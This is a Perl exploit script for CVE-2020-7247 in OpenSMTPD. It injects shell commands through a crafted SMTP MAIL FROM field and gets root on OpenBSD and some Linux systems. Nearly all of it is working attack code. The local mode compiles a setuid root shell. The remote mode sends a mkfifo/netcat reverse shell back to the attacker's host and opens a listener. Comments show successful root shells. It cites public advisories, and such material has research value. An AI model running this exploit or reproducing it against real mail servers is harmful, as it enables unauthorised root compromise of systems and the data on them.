#!/usr/bin/perl

#
# raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
# Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and
# other products, allows remote attackers to execute arbitrary commands as root
# via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL
# FROM field. This affects the "uncommented" default configuration. The issue
# exists because of an incorrect return value upon failure of input validation
# (CVE-2020-7247).
#
# "Wow. I feel all butterflies in my tummy that bugs like this still exist. 
# That's awesome :)" -- skyper
#
# This exploit targets OpenBSD's OpenSMTPD in order to escalate privileges to
# root on OpenBSD in the default configuration, or execute remote commands as 
# root (only in OpenSMTPD "uncommented" default configuration).
#
# See also:
# https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
# https://poolp.org/posts/2020-01-30/opensmtpd-advisory-dissected/
# https://www.kb.cert.org/vuls/id/390745/
# https://www.opensmtpd.org/security.html
#
# Usage (LPE):
# phish$ uname -a
# OpenBSD phish.fnord.st 6.6 GENERIC#353 amd64
# phish$ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor), 0(wheel)
# phish$ ./raptor_opensmtpd.pl LPE
# [...]
# Payload sent, please wait 5 seconds...
# -rwsrwxrwx  1 root  wheel  12432 Feb  1 21:20 /usr/local/bin/pwned
# phish# id
# uid=0(root) gid=0(wheel) groups=1000(raptor), 0(wheel)
#
# Usage (RCE):
# raptor@eris ~ % ./raptor_opensmtpd.pl RCE 10.0.0.162 10.0.0.24 example.org
# [...]
# Payload sent, please wait 5 seconds...
# /bin/sh: No controlling tty (open /dev/tty: Device not configured)
# /bin/sh: Can't find tty file descriptor
# /bin/sh: warning: won't have full job control
# phish# id
# uid=0(root) gid=0(wheel) groups=0(wheel)
#
# Vulnerable platforms (OpenSMTPD 6.4.0 - 6.6.1):
# OpenBSD 6.6 [tested]
# OpenBSD 6.5 [untested]
# OpenBSD 6.4 [untested]
# Debian GNU/Linux bullseye/sid with opensmtpd 6.6.1p1-1 [tested]
# Other Linux distributions [untested]
# FreeBSD [untested]
# NetBSD [untested]
# 

use IO::Socket::INET;

print "raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD\n";
print "Copyright (c) 2020 Marco Ivaldi <raptor\@0xdeadbeef.info>\n\n";

$usage = "Usage:\n".
"$0 LPE\n".
"$0 RCE <remote_host> <local_host> [<domain>]\n";
$lport = 4444;

($type, $rhost, $lhost, $domain) = @ARGV;
die $usage if (($type ne "LPE") && ($type ne "RCE"));

# Prepare the payload
if ($type eq "LPE") { # LPE
	$payload = "cp /bin/sh /usr/local/bin/pwned\n".
	"echo 'main(){setuid(0);setgid(0);system(\"/bin/sh\");}' > /tmp/pwned.c\n".
	"gcc /tmp/pwned.c -o /usr/local/bin/pwned\nchmod 4777 /usr/local/bin/pwned";
	$rhost = "127.0.0.1";
} else { # RCE
	die $usage if ((not defined $rhost) || (not defined $lhost));
	$payload = "sleep 5;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|".
	"nc $lhost $lport >/tmp/f";
}

# Open SMTP connection
$| = 1;
$s = IO::Socket::INET->new("$rhost:25") or die "Error: $@\n";

# Read SMTP banner
$r = <$s>;
print "< $r";
die "Error: this is not OpenSMTPD\n" if ($r !~ /OpenSMTPD/);

# Send HELO
$w = "HELO fnord";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send evil MAIL FROM
$w = "MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send RCPT TO
if (not defined $domain) {
	$rcpt = "<root>";
} else {
	$rcpt = "<root\@$domain>";
}
$w = "RCPT TO:$rcpt";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send payload in DATA
$w = "DATA";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
$w = "\n#0\n#1\n#2\n#3\n#4\n#5\n#6\n#7\n#8\n#9\n#a\n#b\n#c\n#d\n$payload\n.";
#print "> $w\n"; # uncomment for debugging
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Close SMTP connection
$s->close();
print "\nPayload sent, please wait 5 seconds...\n";

# Got root?
if ($type eq "LPE") { # LPE
	sleep 5;
	print `ls -l /usr/local/bin/pwned`;
	exec "/usr/local/bin/pwned" or die "Error: exploit failed :(\n";
} else { # RCE
	exec "nc -vl $lport" or die "Error: unable to execute netcat\n"; # BSD netcat
	#exec "nc -vlp $lport" or die "Error: unable to execute netcat\n"; # Debian netcat
}

